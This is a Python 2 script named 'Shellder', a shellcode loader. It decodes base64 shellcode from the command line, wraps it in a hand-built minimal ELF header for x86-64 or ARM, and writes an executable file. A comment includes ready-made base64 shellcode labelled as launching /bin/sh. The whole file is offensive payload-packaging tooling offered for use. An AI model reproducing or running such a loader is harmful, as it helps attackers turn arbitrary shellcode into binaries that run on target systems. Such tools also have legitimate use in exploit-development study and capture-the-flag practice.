import argparse
import base64
import re
import subprocess

# USAGE: python shellder.py  -p'<base64hash>' -t <target arch>
# launch /bin/sh = McBIu9GdlpHQjJf/SPfbU1RfmVJXVF6wOw8F
# smile = sAFIicdIx8aPAEAAsgsPBbA8SDH/DwVbXjBeXSB1ISEK

parser = argparse.ArgumentParser(description='Shellder - Flexible Shellcode Loader')
parser.add_argument('-p',action='store',dest='shc', help="Payload Base64 Hash")
parser.add_argument('-t',action='store',dest='target_machine', help="Target Machine")
args = parser.parse_args()
shc = args.shc
target_machine = args.target_machine

banner = '''
         ,,             AW        ,,    ,,        ,,                  
       `7MM            ,M'      `7MM  `7MM      `7MM        v0.171221 
         MM            MV         MM    MM        MM                  
,pP"Ybd  MMpMMMb.     AW .gP"Ya   MM    MM   ,M""bMM  .gP"Ya `7Mb,od8 
8I   `"  MM    MM    ,M',M'   Yb  MM    MM ,AP    MM ,M'   Yb  MM' "' 
`YMMMa.  MM    MM    MV 8M""""""  MM    MM 8MI    MM 8M""""""  MM     
L.   I8  MM    MM   AW  YM.    ,  MM    MM `Mb    MM YM.    ,  MM     
M9mmmP'.JMML  JMML.,M'   `Mbmmd'.JMML..JMML.`Wbmd"MML.`Mbmmd'.JMML.   
                   MV                                                 
                  AW   '''

def decode_b64(data):
    if '=' in data:
       data = data[:data.index('=')]
    missing_padding = len(data) % 4
    if missing_padding == 1:
       data += 'A=='
    elif missing_padding == 2:
       data += '=='
    elif missing_padding == 3:
       data += '='
    return base64.b64decode(data)

newshc = decode_b64(shc)
pl0ad = "".join("{:02x}".format(ord(c)) for c in newshc)
pl0ad = re.findall('..',pl0ad)

if target_machine == 'elf64-x86-64':
  elf64_x86_64 = ['7f','45','4c','46','02','01','01','00',
                  '00','00','00','00','00','00','00','00',
                  '02','00','3e','00','01','00','00','00',
                  '78','00','40','00','00','00','00','00',
                  '40','00','00','00','00','00','00','00',
                  '00','00','00','00','00','00','00','00',
                  '00','00','00','00','40','00','38','00',
                  '01','00','40','00','00','00','00','00',
                  '01','00','00','00','05','00','00','00',
                  '00','00','00','00','00','00','00','00',
                  '00','00','40','00','00','00','00','00',
                  '00','00','40','00','00','00','00','00']

  shc_size = format(len(newshc),'x')
  pad = ['00','00','00','00','00','00','00']
  pad = [shc_size] + pad
  eoh = ['00','00','20','00','00','00','00','00']

  newBin = elf64_x86_64 + pad + pad + eoh + pl0ad

elif target_machine == 'elf32-littlearm':
  elf32_littlearm = ['7F','45','4C','46','01','01','01','00',
                     '00','00','00','00','00','00','00','00',
                     '02','00','28','00','01','00','00','00',
                     '54','00','01','00','34','00','00','00',
                     'E0','00','00','00','00','02','00','05',
                     '34','00','20','00','01','00','28','00',
                     '05','00','04','00','01','00','00','00',
                     '00','00','00','00','00','00','01','00',
                     '00','00','01','00']
  shc_size = format(len(newshc),'x')
  pad = ['00','00','00']
  pad = [shc_size] + pad 
  eoh = ['05','00','00','00','00','00','01','00']

  newBin = elf32_littlearm + pad + pad + eoh + pl0ad


else: 
  print 'Target Machine Error'
  exit(1)

def writeBin():
  f = open('shldr','wb')
  for s in newBin:
      f.write(chr(int(s,16)))
  f.close()

def main():
  print banner,
  print "payload size 0x" + shc_size + " bytes | exec ---> ./shldr\n"
  writeBin()

main()
